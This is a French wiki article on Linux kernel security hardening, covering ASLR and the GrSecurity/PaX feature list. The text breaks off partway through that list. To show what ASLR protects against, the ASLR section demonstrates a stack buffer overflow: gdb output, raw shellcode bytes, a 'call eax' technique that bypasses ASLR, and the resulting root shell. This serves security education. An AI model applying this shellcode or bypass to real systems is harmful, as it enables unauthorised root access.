@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="client-nojs">
+<head>
+<meta charset="UTF-8" />
+<title>Renforcement des fonctions de sécurité du noyau Linux - Deimos.fr / Bloc Notes Informatique</title>
+<meta name="generator" content="MediaWiki 1.25.5" />
+<link rel="shortcut icon" href="https://wiki.deimos.fr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="opensearch_desc.php" title="Deimos.fr / Bloc Notes Informatique (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="https://wiki.deimos.fr/api.php?action=rsd" />
+<link rel="alternate" hreflang="x-default" href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr" />
+<link rel="alternate" type="application/atom+xml" title="Deimos.fr / Bloc Notes Informatique Atom feed" href="https://wiki.deimos.fr/index.php?title=Special:RecentChanges&amp;feed=atom" />
+<link rel="stylesheet" href="load.php%3Fdebug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint,shared|mediawiki.sectionAnchor|mediawiki.skinning.interface|mediawiki.ui.button|skins.vector.styles&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<link rel="stylesheet" href="load.php%3Fdebug=false&amp;lang=en&amp;modules=site&amp;only=styles&amp;skin=vector&amp;*.css" />
+<style>a:lang(ar),a:lang(kk-arab),a:lang(mzn),a:lang(ps),a:lang(ur){text-decoration:none}
+/* cache key: blocnotesinfo-wiki_:resourceloader:filter:minify-css:7:6f8c0c45eefd74c7bbe9478b32df38c0 */</style>
+<script src="load.php%3Fdebug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if(window.mw){
+mw.config.set({"wgCanonicalNamespace":"","wgCanonicalSpecialPageName":false,"wgNamespaceNumber":0,"wgPageName":"Renforcement_des_fonctions_de_sécurité_du_noyau_Linux","wgTitle":"Renforcement des fonctions de sécurité du noyau Linux","wgCurRevisionId":5097,"wgRevisionId":5097,"wgArticleId":2326,"wgIsArticle":true,"wgIsRedirect":false,"wgAction":"view","wgUserName":null,"wgUserGroups":["*"],"wgCategories":[],"wgBreakFrames":false,"wgPageContentLanguage":"en","wgPageContentModel":"wikitext","wgSeparatorTransformTable":["",""],"wgDigitTransformTable":["",""],"wgDefaultDateFormat":"dmy","wgMonthNames":["","January","February","March","April","May","June","July","August","September","October","November","December"],"wgMonthNamesShort":["","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"wgRelevantPageName":"Renforcement_des_fonctions_de_sécurité_du_noyau_Linux","wgRelevantArticleId":2326,"wgIsProbablyEditable":false,"wgRestrictionEdit":[],"wgRestrictionMove":[],"wgWikiEditorEnabledModules":{"toolbar":true,"dialogs":true,"hidesig":true,"preview":true,"publish":false}});
+}</script><script>if(window.mw){
+mw.loader.implement("user.options",function($,jQuery){mw.user.options.set({"variant":"en"});});mw.loader.implement("user.tokens",function($,jQuery){mw.user.tokens.set({"editToken":"+\\","patrolToken":"+\\","watchToken":"+\\"});});
+/* cache key: blocnotesinfo-wiki_:resourceloader:filter:minify-js:7:a5c52c063dc436c1ca7c9f456936a5e9 */
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.page.startup","mediawiki.legacy.wikibits","mediawiki.legacy.ajax","skins.vector.js"]);
+}</script>
+<style type="text/css">/*<![CDATA[*/
+.source-text {line-height: normal;}
+.source-text li, .source-text pre {
+	line-height: normal; border: 0px none white;
+}
+/**
+ * GeSHi Dynamically Generated Stylesheet
+ * --------------------------------------
+ * Dynamically generated stylesheet for text
+ * CSS class: source-text, CSS id: 
+ * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
+ * (http://qbnz.com/highlighter/ and http://geshi.org/)
+ * --------------------------------------
+ */
+.text.source-text .de1, .text.source-text .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;font-family: monospace, monospace;}
+.text.source-text  {font-family:monospace;}
+.text.source-text .imp {font-weight: bold; color: red;}
+.text.source-text li, .text.source-text .li1 {font-weight: normal; vertical-align:top;}
+.text.source-text .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
+.text.source-text .li2 {font-weight: bold; vertical-align:top;}
+.text.source-text .ln-xtra, .text.source-text li.ln-xtra, .text.source-text div.ln-xtra {background-color: #ffc;}
+.text.source-text span.xtra { display:block; }
+
+/*]]>*/
+</style>
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/skins/Vector/csshover.min.htc")}</style><![endif]-->
+</head>
+<body class="mediawiki ltr sitedir-ltr ns-0 ns-subject page-Renforcement_des_fonctions_de_sécurité_du_noyau_Linux skin-vector action-view vector-animateLayout">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<div id="content" class="mw-body" role="main">
+			<a id="top"></a>
+
+						<h1 id="firstHeading" class="firstHeading" lang="en"><span dir="auto">Renforcement des fonctions de sécurité du noyau Linux</span></h1>
+						<div id="bodyContent" class="mw-body-content">
+									<div id="siteSub">From Deimos.fr / Bloc Notes Informatique</div>
+								<div id="contentSub"></div>
+												<div id="jump-to-nav" class="mw-jump">
+					Jump to:					<a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#mw-navigation">navigation</a>, 					<a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#p-search">search</a>
+				</div>
+				<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><div id="toc" class="toc"><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#Introduction"><span class="tocnumber">1</span> <span class="toctext">Introduction</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#Pr.C3.A9sentation"><span class="tocnumber">2</span> <span class="toctext">Présentation</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#Address_Space_Layout_Randomization"><span class="tocnumber">3</span> <span class="toctext">Address Space Layout Randomization</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#GrSecurity_et_PaX"><span class="tocnumber">4</span> <span class="toctext">GrSecurity et PaX</span></a></li>
+<li class="toclevel-1 tocsection-5"><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#SELinux"><span class="tocnumber">5</span> <span class="toctext">SELinux</span></a>
+<ul>
+<li class="toclevel-2 tocsection-6"><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#Partie_1"><span class="tocnumber">5.1</span> <span class="toctext">Partie 1</span></a></li>
+<li class="toclevel-2 tocsection-7"><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#Partie_2"><span class="tocnumber">5.2</span> <span class="toctext">Partie 2</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-8"><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#Netfilter.2C_conclusions_.26_webographie"><span class="tocnumber">6</span> <span class="toctext">Netfilter, conclusions &amp; webographie</span></a></li>
+<li class="toclevel-1 tocsection-9"><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#Ressources"><span class="tocnumber">7</span> <span class="toctext">Ressources</span></a></li>
+</ul>
+</div>
+
+<h1><span class="mw-headline" id="Introduction"><span class="mw-headline-number">1</span> Introduction</span></h1>
+<p>Ce dossier vous propose de faire un tour d'horizon des différents mécanismes de sécurité liés aux noyaux des systèmes d'exploitation de type GNU/LINUX afin de garantir la sauvegarde de l'intégrité de votre environnement. Dans cette première partie vous trouverez une introduction à ces mécanismes ainsi qu'aux noyaux des systèmes GNU/LINUX en général.
+</p>
+<h1><span class="mw-headline" id="Pr.C3.A9sentation"><span class="mw-headline-number">2</span> Présentation</span></h1>
+<p>L'engouement croissant des utilisateurs pour le système d'exploitation Linux, et plus particulièrement de la part des experts en sécurité ou des administrateurs système, est dû en grande partie à la robustesse et aux fonctionnalités avancées que propose ce système d'exploitation. Le noyau, plus souvent cité sous son appellation de forme anglaise kernel , coeur du système, gère la majeure partie des fonctions relatives à la sécurité de l'environnement.
+</p><p>Le processus et la qualité de développement de Linux sont désormais reconnus. Il se base sur une très large communauté d'experts et de passionnés qui contribue à l'évolution du projet et à ses perpétuelles corrections. Il s'agit en effet ici d'une propriété particulièrement déterminante dans le choix des équipements présents au sein d'une infrastructure sécurisée.
+</p><p>Les correctifs de sécurité pour les systèmes Linux sont publiés très rapidement et il n'est pas rare de les avoir à disposition dans les vingt quatre heures qui suivent la publication d'une faille de sécurité sur une liste type full-disclosure (bugtraq, etc.).
+</p><p>Plusieurs fonctionnalités relatives à la sécurité sont intégrées nativement dans le noyau Linux. Citons celles pour la gestion des syncookies, permettant notamment de faire face aux attaques du type SYN flood par exemple, celles pour les fonctionnalités de filtrage assurées par Netfilter ou encore d'autres moins explicites mais permettant de renforcer globalement la sécurité du système.
+</p><p>Une distinction importante doit être faite entre la sécurité du réseau gérée au niveau du système d'exploitation (gestion de l'aléa des IP ID, restrictions sur les sockets, filtrage de niveau 3, etc.) et la sécurité applicative permettant de se prémunir, ou de limiter l'exploitation possible, des failles logicielles de plus haut niveau. Elles font généralement partie du user land.
+</p><p>Le noyau Linux retenu dans cet article est le 2.6.16.9, dernière version stable à la date de rédaction. Les versions supérieures seront dotées des mêmes fonctionnalités et en proposeront bien sûr de nouvelles. Les différents patches présentés dans les chapitres suivants devront être récupérés en fonction de la version utilisée bien sûr, mais la démarche reste globalement identique.
+</p><p>GrSecurity est sans doute le projet de ce type le plus connu bien qu'il soit l'un des moins supportés financièrement. SELinux (Security Enhanced Linux), au contraire, dispose d'importantes ressources, étant développé par la NSA (National Security Agency – organisation américaine de renseignement spécialisée dans les nouvelles technologies).
+</p><p>Les approches de GrSecurity et de SELinux sont diamétralement opposées&#160;: GrSecurity renforce la sécurité du système en amont, ajoutant de nombreuses fonctionnalités applicatives permettant de rendre très complexe l'exploitation des failles logicielles (buffer overflows dans la pile, le tas, bugs de format, race conditions, etc.).
+</p><p>SELinux, quant à lui, opte pour la restriction de l'environnement offert à un attaquant suite à la compromission du système. L'attaquant est alors restreint avec des privilèges peu élevés et est cantonné au strict minimum. Il s'agit d'une approche par MAC (Mandatory Access Control).
+</p><p>Les différentes approches, qu'elles soient placées en amont ou en aval de la compromission, seront présentées dans cet article. Elles ont toutes de multiples avantages et inconvénients, notamment en termes de performances. L'emploi simultané des deux solutions, bien envisageable dans la théorie, se révèle bien trop lourd en pratique. En sécurité, tout est affaire de compromis...
+</p><p>Des prérequis techniques sont nécessaires à la bonne compréhension de cette article, notamment ceux concernant les exploitations de failles sous Linux (buffer/heap overflows principalement). Le lecteur pourra se référer à l'abondante littérature disponible sur Internet à ce sujet. 
+</p>
+<h1><span class="mw-headline" id="Address_Space_Layout_Randomization"><span class="mw-headline-number">3</span> Address Space Layout Randomization</span></h1>
+<p>ASLR ou Address Space Layout Randomization est une fonctionnalité du noyau Linux permettant de rendre aléatoire l'espace d'adressage mémoire de zones comme le tas (heap) ou la pile (stack) afin de compliquer le travail d'un attaquant souhaitant compromettre une machine via une attaque de type buffer overflow par exemple.
+</p><p>Une nouveauté de taille est apparue récemment dans le noyau Linux, avec le support natif de l'équivalent d'ASLR (Address Space Layout Randomization). Ce dernier permet de rendre aléatoire l'espace d'adressage mémoire de certaines zones, telles que le tas (heap) ou la pile (stack).
+</p><p>En effet, ces deux dernières sections mémoire contiennent la plupart du temps les buffers d'un processus. Les allocations dynamiques (*malloc) sont placées dans le tas tandis que les statiques (char/int/... *buff[SIZE]) sont placées dans la pile.
+</p><p>Les fameux médiatiques buffer overflows (débordements de buffer) exploitent donc ces zones de la mémoire afin d'y placer un shellcode (suite d'OPCODEs) et de rediriger ensuite le flot d'exécution vers l'adresse le contenant.
+</p><p>En rendant ces adresses aléatoires, l'attaquant ne peut plus utiliser les techniques classiques d'exploitation, les réussites d'exploitation sont donc bien souvent plus rares.
+</p><p>Un processus nommé «&#160;srv&#160;» est lancé ci-dessous. Une analyse des zones mémoires allouées aux sections permet de constater que la pile est contenue entre les adresses 0xBF7F7000 et 0xBF80D000&#160;: 
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">$srv&amp;
+[3027]
+&#160;
+$ cat /proc/3027/maps
+(...)
+0804a000-0806b000 rw-p 0804a000 00:00 0 [heap]
+b7da3000-b7da4000 rw-p b7da3000 00:00 0
+b7da4000-b7ed2000 r-xp 00000000 03:04 345236 /lib/tls/libc-2.3.6.so
+b7ed2000-b7ed7000 r--p 0012e000 03:04 345236 /lib/tls/libc-2.3.6.so
+b7ed7000-b7eda000 rw-p 00133000 03:04 345236 /lib/tls/libc-2.3.6.so
+b7eda000-b7edc000 rw-p b7eda000 00:00 0
+b7ef5000-b7ef8000 rw-p b7ef5000 00:00 0
+b7ef8000-b7f0d000 r-xp 00000000 03:04 2032253 /lib/ld-2.3.6.so
+b7f0d000-b7f0f000 rw-p 00015000 03:04 2032253 /lib/ld-2.3.6.so
+bf7f7000-bf80d000 rw-p bf7f7000 00:00 0 [stack]
+ffffe000-fffff000 ---p 00000000 00:00 0 [vdso]Texte</pre></div></div>
+<p>Lors d'un second lancement du même processus, nous constatons que l'adresse de la pile a effectivement changé et se trouve désormais entre 0xBF865000 et BxBF87B000&#160;: 
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">$srv&amp;
+[3593]
+&#160;
+$ cat /proc/3593/maps
+(...)
+0804a000-0806b000 rw-p 0804a000 00:00 0 [heap]
+b7e11000-b7e12000 rw-p b7e11000 00:00 0
+b7e12000-b7f40000 r-xp 00000000 03:04 345236 /lib/tls/libc-2.3.6.so
+b7f40000-b7f45000 r--p 0012e000 03:04 345236 /lib/tls/libc-2.3.6.so
+b7f45000-b7f48000 rw-p 00133000 03:04 345236 /lib/tls/libc-2.3.6.so
+b7f48000-b7f4a000 rw-p b7f48000 00:00 0
+b7f63000-b7f66000 rw-p b7f63000 00:00 0
+b7f66000-b7f7b000 r-xp 00000000 03:04 2032253 /lib/ld-2.3.6.so
+b7f7b000-b7f7d000 rw-p 00015000 03:04 2032253 /lib/ld-2.3.6.so
+bf865000-bf87b000 rw-p bf865000 00:00 0 [stack]
+ffffe000-fffff000 ---p 00000000 00:00 0 [vdso]Texte</pre></div></div>
+<p>Analysons désormais le cas plus concret d'une faille logicielle sur l'exemple ci-dessous. Celui-ci contient la fonction here_is_the_bug qui effectue une copie non bornée de tampon mémoire dans «&#160;buffer&#160;» d'une taille fixe de 150 octets (celui-ci est placé dans la pile)&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">(gdb) list here_is_the_bug
+20 char * Connection;
+21 } browser;
+22
+23
+24 void here_is_the_bug(pbrowser Browser)
+25 {
+26
+27 char buffer[150];
+28 if(Browser-&gt;UserAgent&#160;!= NULL)
+29 {
+30 strcpy(buffer,Browser-&gt;UserAgent);
+31 }
+32 }</pre></div></div>
+<p>En utilisant le débogueur gdb, plaçons maintenant deux breakpoints (points d'arrêts logiciels), avant et après la réécriture de l'adresse de retour (saved eip) placée dans la pile. Le buffer est ici placé à l'adresse 0xBFC73960. Après réécriture du buffer, nous passons le deuxième point d'arrêt. Le programme plante «&#160;normalement&#160;» (l'adresse utilisée pour la réécriture étant fausse et ne pointe plus dans la pile)&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">(gdb) b 31
+Breakpoint 1 at 0x804859e: file srv.c, line 31.
+&#160;
+(gdb) run &lt; paquet_mal
+Breakpoint 1, here_is_the_bug (Browser=bfff0xf3a7) at srv.c:32
+32 }
+&#160;
+(gdb) print &amp;buffer
+$1 = (char (*)[150]) 0xbfc73960
+&#160;
+&#160;
+(gdb) c
+Continuing.
+&#160;
+Program received signal SIGSEGV, Segmentation fault.
+0xbffff3a7 in&#160;?? ()</pre></div></div>
+<p>En relançant le même exécutable, au premier point d'arrêt, nous constatons le changement d'adresse&#160;: le tampon concerné se situe désormais en 0xBF999AE0&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">(gdb) run &lt; paquet_mal
+Breakpoint 1, here_is_the_bug (Browser=bfff0xf3a7) at srv.c:32
+32 }
+&#160;
+(gdb) print &amp;buffer
+$2 = (char (*)[150]) 0xbf999ae0</pre></div></div>
+<p>Il n'est donc plus possible d'utiliser les techniques dites classiques afin de rediriger le flot d'exécution. Au mieux avec cette technique, l'attaquant provoquera un DoS (Denial Of Service - Déni de Service).
+</p><p>Malgré le niveau de sécurité plus élevé qu'apporte cette solution, nous avons constaté en l'étudiant, que cette protection pouvait être outrepassée en utilisant des moyens détournés...
+</p><p>Lors du deuxième point d'arrêt, placé avant le retour de la fonction, et après réécriture de l'adresse de retour (la saved eip affichée par gdb, 0xBFFFf3A7 n'est autre que celle que nous avons réécrite), nous analysons les valeurs des registres&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">(gdb) info frame
+Stack level 0, frame at 0xbf999b90:
+eip = 0x804859e in here_is_the_bug (srv.c:32); saved eip 0xbffff3a7
+called by frame at 0xbf999b94
+source language c.
+Arglist at 0xbf999b88, args: Browser=0xbffff3a7
+Locals at 0xbf999b88, Previous frame's sp is 0xbf999b90
+Saved registers:
+ebp at 0xbf999b88, eip at 0xbf999b8c
+&#160;
+(gdb) info registers
+eax 0xbf999ae0 -1080452384
+ecx 0xbf999bbd -1080452163</pre></div></div>
+<p>La valeur contenue dans le registre EAX est... l'adresse de notre buffer&#160;! Cette propriété est due à l'emploi de la fonction strcpy. En effet, si nous nous plaçons à un niveau plus bas (code assembleur), les différentes adresses et valeurs utilisées sont placées dans les registres appropriés, puis un saut vers le code de la fonction strcpy est ensuite effectué. Cette fonction ne pouvant se passer de l'adresse destination du buffer, il est logique qu'elle soit placée dans un registre accessible (ici EAX).
+</p><p>Vérifions l'hypothèse selon laquelle l'adresse d'EAX contient effectivement notre suite d'instructions placée précédemment en mémoire (suite de NOP puis shellocode)&#160;: 
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">(gdb) x/5bi 0xbf999ae0
+0xbf999ae0: nop
+0xbf999ae1: nop
+0xbf999ae2: nop
+0xbf999ae3: nop
+0xbf999ae4: nop
+&#160;
+(gdb) x/100bx 0xbf999ae0
+0xbf999ae0: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xbf999ae8: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xbf999af0: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xbf999af8: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xbf999b00: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xbf999b08: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0xbf999b10: 0x90 0x90 0x90 0x90 0x90 0x31 0xc0 0x31
+0xbf999b18: 0xdb 0x31 0xc9 0xb0 0x46 0xcd 0x80 0x31
+0xbf999b20: 0xc0 0x50 0x68 0x2f 0x2f 0x73 0x68 0x68
+0xbf999b28: 0x2f 0x62 0x69 0x6e 0x89 0xe3 0x8d 0x54
+0xbf999b30: 0x24 0x08 0x50 0x53 0x8d 0x0c 0x24 0xb0
+0xbf999b38: 0x0b 0xcd 0x80 0x31 0xc0 0xb0 0x01 0xcd
+0xbf999b40: 0x80 0xbf 0xa7 0xf3</pre></div></div>
+<p>Les octets 0x90 sont les NOP, permettant la plupart du temps de réduire l'heuristique nécessaire à l'exploitation d'un buffer overflow (nous aurions pu nous en passer dans ce cas d'exploitation). Au passage, notons les OPCODEs 0xCD80 (en gras ci-dessus) qui représentent l'appel à l'interruption d'exécution pour nous céder un shell sur la machine distante (int $0x80).
+</p><p>Le principe d'exploitation est alors très clair&#160;: nous devons faire exécuter à la machine l'équivalent d'un jmp&#160;%eax ou call&#160;%eax qui sautera directement sur notre shellcode.
+</p><p>En effectuant une recherche dans la mémoire du processus, grâce à l'opcode finder que nous avons développé pour l'occasion, nous trouvons une adresse (en zone d'adressage fixe cette fois-ci) contenant les OPCODEs de l'instruction «&#160;call EAX&#160;»&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1"># ./memory_dumper 080484b0 0804A4b0 10497 output
+Found at 0x8048c03</pre></div></div>
+<p>Étant donné que le registre EAX pointe sur notre buffer (qui contient un shellcode valide), le contournement est alors effectué&#160;: 
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1"># ./exploit localhost 8000 0
+Using align value 0
+Trying «&#160;call eax&#160;» compliant address&#160;: 0x08048c03
+&#160;
+Linux lapt41p 2.6.16 #3 PREEMPT i686 GNU/Linux
+uid=0(root) gid=0(root) groups=0(root)
+&#160;
+#</pre></div></div>
+<p>De plus amples informations techniques au sujet d'ASLR sont disponibles aux adresses suivantes&#160;:
+</p><p><a rel="nofollow" class="external text" href="http://lwn.net/Articles/121845/">Lwn.net</a>
+</p><p><a rel="nofollow" class="external text" href="http://searchopensource.techtarget.com/tip/1,289483,sid39_gci1144658,00.html">Searchopensource.techtarget.com</a>
+</p><p><a rel="nofollow" class="external text" href="http://www.metasploit.com/archive/framework/msg00735.html">Metasploit msg 00735</a>
+</p><p><a rel="nofollow" class="external text" href="http://www.metasploit.com/archive/framework/msg00736.html">Metasploit msg 00736 </a>
+</p><p><br />
+D'autres protections, situées en userland via la librairie libc, permettent entre autres de se prémunir d'exploitations dans le tas via la méthode unlink. Elles sont complémentaires à une utilisation d'ASLR et ne seront pas décrites dans cet article.
+</p>
+<h1><span class="mw-headline" id="GrSecurity_et_PaX"><span class="mw-headline-number">4</span> GrSecurity et PaX</span></h1>
+<p>GrSecurity permet de renforcer la sécurité des processus en mode userland, grâce à lui il est possible de rendre plus complexe l'exploitation d'une vulnérabilité par un attaquant sur un système d'exploitation. GrSecurity s'appuie notamment sur PaX pour les protections relatives au traitement de la mémoire kernel et user land.
+</p><p>GrSecurity propose une approche «&#160;amont&#160;» des renforcements de la sécurité du noyau. Par ce biais, la sécurité des processus en userland peut être également renforcée. Le noyau joue en effet un rôle majeur dans la gestion des processus. Il définit l'utilisation des plages mémoire (pile, tas, adresse de base du chargement des binaires, etc...) et les zones d'exécution, lecture ou écriture.
+</p><p>En combinant plusieurs techniques, il est possible de rendre particulièrement complexe l'exploitation de vulnérabilités présentes sur le système. Au meilleur des cas (sauf contournement des protections), un attaquant provoquera un déni de service sur le processus vulnérable (ce qui peut tout de même être critique en fonction de l'utilisation qui en est faite), ou de façon plus grave, sur le noyau.
+</p><p>GrSecurity se présente comme un patch kernel. Il est actualisé très régulièrement et est disponible à l'adresse suivante.
+</p><p>De nombreuses fonctionnalités sont intégrées dans GrSecurity, dont la plus connue étant PaX qui permet d'ajouter plusieurs protections relatives au traitement de la mémoire kernel et user land.
+</p><p>Voici la liste des principales fonctionnalités de GrSecurity (de plus amples détails techniques sont disponibles sur le site officiel du projet)&#160;:
+</p>
+<ul><li> Role-Based Access Control (RBAC), qui permet de faire une segmentation des restrictions de GrSecurity en fonction de nombreux critères&#160;: utilisateur, processus, fichier...</li>
+<li> Contrôle sur les fonctionnalités réseau de niveau 3</li>
+<li> Possibilités de capabilities pouvant être attribuées à des utilisateurs non root, et ce sans authentification préalable.</li>
+<li> Support de scripting dans la configuration (gestion de variables, d'opérateurs logiques, etc.)</li>
+<li> Gestion objets avec de possibles héritages pour les définitions d'ACL.</li>
+<li> Création et suppression dynamiques d'objets.</li>
+<li> Résolution temps réel des expressions régulières (traitement temporel possible)</li>
+<li> Protection de l'appel système ptrace (débogage dynamique pouvant être utilisé pour contourner certaines protections) en fonction de l'utilisateur et/ou du processus.</li>
+<li> Entrée /dev/grsec de devfs permettant un interfaçage kernel land / user land.</li>
+<li> Code «&#160;next-generation&#160;» qui produit des policies de moindres privilèges pour l'intégralité du système sans configuration nécessaire au préalable.</li>
+<li> Policies statiques configurables avec l'outil gradm.</li>
+<li> Possibilité de création dynamique des policies avec un mode learning qui permet de réduire considérablement le travail de l'administrateur système et de déboguer rapidement les problèmes classiques entraînés par l'usage d'ACL.</li>
+<li> Protection sur l'environnement, les noms de fichiers, etc.</li>
+<li> /proc/&lt;pid&gt;/ipaddr permet de lister l'adresse IP distante de l'utilisateur ayant initié une connexion ou lancé un processus réseau.</li>
+<li> Support de lecture/écriture/exécution des appels à ptrace</li>
+<li> Support des flags PaX pour protéger certains binaires uniquement, ou assouplir la politique sur d'autres (particulièrement pratique pour un serveur X par exemple).</li>
+<li> Protection sur les fonctions de la mémoire partagée (shared memory).</li>
+<li> Surveillance de certains flags propres au processeur (notamment dans le cadre de la lutte contre les codes offensifs)&#160;: trojans, spywares...</li>
+<li> Fonctions d'audit pouvant être appliquées à certains utilisateurs uniquement (restricted GID)</li>
+<li> Support de restrictions sur les ressources, sockets et capabilities.</li>
+<li> Protection contre les bruteforces d'adresses des exploits.</li>
+<li> Protection sur les fichiers de procfs /proc/[PID] (mémoire, mappages, etc.).</li>
+<li> Regénération des policies possible.</li>
+<li> Suppression configurable des logs.</li>
+<li> Configuration possible des processus liés à la gestion des comptes (création, suppression, modification...).</li>
+<li> Configuration intuitive et rapide.</li>
+<li> Indépendance du système de fichier et de l'architecture.</li>
+<li> Répercussions minimes sur les performances globales du système.</li>
+<li> Support des multi-processeurs (SMP).</li>
+<li> La plupart des opération s'effectue en complexité O(1).</li>
+<li> Activation/désactivation et rechargement dynamique des capabilities via procfs.</li>
+<li> Option permettant de cacher les processus utilisateurs aux autres utilisateurs «&#160;normaux&#160;» du système.</li>
+<li> Restrictions procfs (/proc) sur la diffusion d'informations aux «&#160;utilisateurs normaux&#160;», y compris sur les processus leur appartenant.</li>
+<li> Restrictions sur les liens symboliques et physiques (sur les inodes) afin de contrer les attaques de race conditions.</li>
+<li> Restrictions sur la pile (exécution, manipulation, etc.).</li>
+<li> Impossibilité aux utilisateurs «&#160;normaux&#160;» d'accéder aux informations de dmesg, informations souvent renvoyées par le noyau ou par les modules.</li>
+<li> Amélioration de l'implémentation du Trusted Path Execution (TPE)</li>
+<li> Restrictions socket par GID (Group ID).</li>
+<li> Grande flexibilité de la configuration grâce au support par syscontrol (sysctrl).</li>
+<li> Mécanisme de blocage des sysctl après configuration (lock).</li>
+<li> Alertes de sécurité remontées avec les informations réseau de l'attaquant (IP, éventuelle résolution DNS...)</li>
+<li> Arrêt automatique des processus relancés plusieurs fois dans un laps de temps réduit (bruteforces des exploits).</li>
+<li> Modes automatiques dans la configuration&#160;: low, medium et high</li>
+<li> Restrictions configurables sur les attaques par flood et/ou épuisement des ressources.</li>
+<li> Amélioration des générateurs d'aléa.</li>
+<li> PIDs (Processus ID) aléatoires.</li>
+<li> Ports sources TCP aléatoires</li>
+<li> Logs des exécutions (exécutables et arguments).</li>
+<li> Logs sur les tentatives d'accès au ressources non autorisées.</li>
+<li> Logs des appels à l'appel système chdir.</li>
+<li> Logs des appels à mount and unmount.</li>
+<li> Logs des signaux (SIGUP, SIGKILL...).</li>
+<li> Logs des erreurs aux appels à fork.</li>
+<li> Logs des changements de temps.</li>
+<li> PaX: Implémentation des accès utilisateurs aux pages mémoires non exécutables (protections sur les exploitations de ret-into-libc) avec une perte de performances négligeable sur les processeurs Intel.</li>
+<li> PaX: Implémentation des accès utilisateurs aux segments mémoires non exécutables (protections sur les exploitations de ret-into-libc) avec une perte de performances négligeable sur les processeurs Intel.</li>
+<li> PaX: Aléa des adresses de la pile (stack) et de l'adresse de base des fichiers chargés (mmap) sur de nombreuses architectures (i386, sparc, sparc64, alpha, parisc, amd64, ia64, ppc, et mips).</li>
+<li> PaX: Aléa des adresses du tas sur les architectures i386, sparc, sparc64, alpha, parisc, amd64, ia64, ppc, et mips.</li>
+<li> PaX: Aléa de l'adresse de base des exécutables pour les architectures i386, sparc, sparc64, alpha, parisc, amd64, ia64, et ppc.</li>
+<li> PaX: Aléa de la pile noyau (kernel stack).</li>
+<li> PaX: Emulation automatique par rebonds (adressage indirect) sur la libc&#160;: protection anti ret-into-libc (libc5, glibc 2.0, uClibc, Modula-3...).</li>
+<li> PaX: Emulation de la PLT (Procedure Linkage Table) permettant de charger en mémoire les adresses des fonctions à appeler à des adresses aléatoires.</li>
+<li> Modifications dynamiques du noyau impossibles via les pseudos fichiers /dev/mem, /dev/kmem, ou /dev/port.</li>
+<li> Options permettant d'interdire les accès directs aux écritures sur les entrées/sorties (raw IO).</li>
+<li> Pas d'attachement à la mémoire partagée de la part des processus chrootés.</li>
+<li> Pas d'appel à kill à l'intérieur d'un chroot.</li>
+<li> Pas d'appel à ptrace à l'intérieur d'un chroot.</li>
+<li> Pas d'appel à setpgid à l'intérieur d'un chroot.</li>
+<li> Pas d'appel à getpgid à l'intérieur d'un chroot.</li>
+<li> Pas d'appel à getuid à l'intérieur et extérieur d'un chroot.</li>
+<li> Impossibilité d'envoyer des signaux à des processus situés en dehors du chroot en cours.</li>
+<li> Impossibilité de lister les processus en dehors d'un chroot.</li>
+<li> Impossibilité de monter/démonter des partitions à l'intérieur d'un chroot.</li>
